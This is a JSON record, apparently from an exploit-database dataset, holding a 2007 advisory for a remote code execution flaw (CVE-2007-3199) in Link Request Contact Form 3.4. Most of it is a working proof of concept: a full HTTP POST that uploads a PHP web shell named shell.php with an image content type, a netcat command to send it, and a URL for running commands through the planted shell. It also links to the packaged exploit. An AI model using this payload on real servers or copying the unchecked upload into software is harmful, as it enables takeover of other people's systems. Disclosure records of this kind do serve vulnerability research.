{
  "id": "4059",
  "title": "Link Request Contact Form 3.4 - Remote Code Execution",
  "cve": "CVE-2007-3199",
  "vuln_type": "rce",
  "code": "-=[--------------------ADVISORY-------------------]=-\r\n                                             \r\n          Link Request Contact Form v3.4    \r\n                                              \r\n  Author: CorryL    [corryl80@gmail.com]  \r\n-=[-----------------------------------------------]=-\r\n\r\n\r\n-=[+] Application:    Link Request Contact Form\r\n-=[+] Version:        3.4\r\n-=[+] Vendor's URL:   http://www.americanfinancing.net/link-request-contact-form.cfm\r\n-=[+] Platform:       Windows\\Linux\\Unix\r\n-=[+] Bug type:       Remote code injection\r\n-=[+] Exploitation:   Remote\r\n-=[-]\r\n-=[+] Author:           CorryL  ~ corryl80[at]gmail[dot]com ~\r\n-=[+] Reference:       http://corryl.altervista.org/\r\n-=[+] Irc Chan:         irc.darksin.net #x0n3-h4ck       \r\n\r\n\r\n..::[ Descriprion ]::..\r\n\r\n\r\nLink Request Contact Form v3.4 is designed to let your friends or clients request to add their website link(s)\r\nbanner(s) to your website.\r\nUser can upload their banner(s) to a directory being a JPG or GIF file for your review before you post their listing(s).\r\nOnce the user fills in all the details an email will be sent to you with the file location and the users details.\r\nThe script will also email your client with a Confirmation email providing them with the same details.\r\nYou can modify the script to your liking and change the location of where the files will be store easily.\r\nThere are no restrictions and easy installation instructions are provided.\r\n\r\n\r\n..::[ Bug ]::..\r\n\r\nThis software is affection from a bug type remote code injection,\r\na remote attacker is able' to injecting of the code inside the server victim,\r\nto subsequently be performed.\r\nThis happens because' the script allows to insert an image jpg or bmp,\r\nbut not checking the data, and allowing of injecting of the code php.\r\n\r\n\r\n\r\n..::[ Proof Of Concept ]::..\r\n\r\ncut the exploit.txt edit the server-victim information,\r\nusing netcat to sending the exploit to server.\r\n\r\nnc server-victim 80 < exploit.txt\r\n\r\nopen the browser and connection to http://server-victim/uploads/shell.php?cmd=uname -a\r\n\r\n<---------cut here exploit.txt--------->\r\nPOST http://server-victim:80/output.php HTTP/1.1\r\nHost: www.server-victim.com\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2; it; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4\r\nAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 300\r\nProxy-Connection: keep-alive\r\nReferer: http://127.0.0.1/prova/link-request-contact-form.html\r\nCookie: PHPSESSID=0654c063218badc1ad8b5a04edf9198d\r\nContent-Type: multipart/form-data; boundary=---------------------------190291279311134\r\nContent-length: 1115\r\n\r\n-----------------------------190291279311134\r\nContent-Disposition: form-data; name=\"Full_Name\"\r\n\r\naaa\r\n-----------------------------190291279311134\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\naa@aa.aa\r\n-----------------------------190291279311134\r\nContent-Disposition: form-data; name=\"Link_Back\"\r\n\r\nhttp://127.0.0.1/\r\n-----------------------------190291279311134\r\nContent-Disposition: form-data; name=\"Site_Title\"\r\n\r\naa\r\n-----------------------------190291279311134\r\nContent-Disposition: form-data; name=\"You_Web_Address\"\r\n\r\nhttp://127.0.0.1/\r\n-----------------------------190291279311134\r\nContent-Disposition: form-data; name=\"Site_Description\"\r\n\r\naaa\r\n-----------------------------190291279311134\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"shell.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php ob_clean();echo\"Remote command esecution by CorryL http://corryl.altervista.org\";ini_set(\"max_execution_time\",0);passthru($_GET[\"cmd\"]);die;?>\r\n-----------------------------190291279311134\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nSubmit\r\n-----------------------------190291279311134--\r\n\r\n\r\n\r\n<----------------end cut---------------->\r\n\r\n\r\ndownload the netcat+exploit from my server:\r\n\r\nhttp://corryl.altervista.org/index.php?mod=Download/Exploit#exploit-LRCF-v3.4.rar\r\nhttps://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/4059.rar (06112007-exploit-LRCF-v3.4.rar)\r\n\r\n# milw0rm.com [2007-06-11]",
  "url": "https://www.exploit-db.com/exploits/4059"
}